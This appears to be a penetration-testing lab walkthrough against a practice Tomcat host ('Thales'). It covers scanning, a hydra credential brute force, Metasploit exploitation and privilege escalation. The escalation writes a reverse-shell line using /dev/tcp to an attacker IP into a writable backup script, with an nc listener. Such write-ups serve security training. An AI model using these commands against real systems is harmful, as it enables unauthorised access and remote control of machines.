# Exercise 1: Thales

Nmap scans:

![](media/a0c54fb63f29c94c5e486fc72d268901.png)

![](media/2c82f48f4febbcf48e61dd28b15c82e9.png)

![Text Description automatically generated](media/f58a38ebc865fa4611bcb1ec13752d9e.png)

Webpage at port 8080:  
![](media/821e0634392c12abffd837649c1d8a27.png)

(clicked on Manager App)

Default credentials upon google search is admin:admin which did not work

Run dirb:  
![Text Description automatically generated](media/b9d48b92a7ce21001ac2d0053d552d03.png)

/shell/ shows an empty webpage

![Graphical user interface, text, application Description automatically generated](media/764ec86a076c928c398ec39c4a7140bd.png)

When in doubt, brute force!

hydra -L tempusers.txt -P /home/kali/rockyou.txt -f <http://192.168.50.21> http-get /manager/html

Where tempusers.txt contains only two entries: tomcat and admin

![](media/945a48a33bd314e30de2f0b7a430d53f.png)

Search Metasploit for any tomcat exploits that require credentials (use 5th one)

![](media/3b8f37efbc2861c7adac8345bc214988.png)

![Text Description automatically generated](media/567fa52b00074f9fbcd1b243441e5914.png)

Set these options

and run!  
![](media/d94b87382e4b9cbffaf12ec9f99dfa62.png)

Type ‘shell’ in meterpreter shell to go to command shell

Then get an interactive shell using python3 -c ‘import pty; pty.spawn(“/bin/bash”)’

Look for writable directories: find / -type d -writable 2\> /dev/null

Download linpeas from kali to target using the classic python SimpleHTTPServer method

![Text Description automatically generated](media/69032351b93fdf768a617e348e7bb09e.png)

Result:

![](media/cb11169d5a824e50b34c3df26e60e884.png)

![A screenshot of a computer Description automatically generated with medium confidence](media/ac4e26622eee077620524294350a2466.png)

The sudo 1.8.21p2 and the CVE-2021-4034 exploit did not work due to the errors below which occurs in some machines  
![Text Description automatically generated](media/9bccd0fe99fc179d56dfacc6c29e8476.png)

another possible point of entry is the writable backup script.

![Text Description automatically generated](media/c314fd871ac9bc2ff6685a81315f8d35.png)

Write to backup.sh:

sh -i \>& /dev/tcp/192.168.50.5/4443 0\>&1

Which will create a reverse shell onto our machine on port 4443 (since 4444 is used by Metasploit)

![](media/e014c07c410df5d705c1dbe8158d32b9.png)Run nc -nlvp 4443 on kali to listen and wait until the script triggers automatically
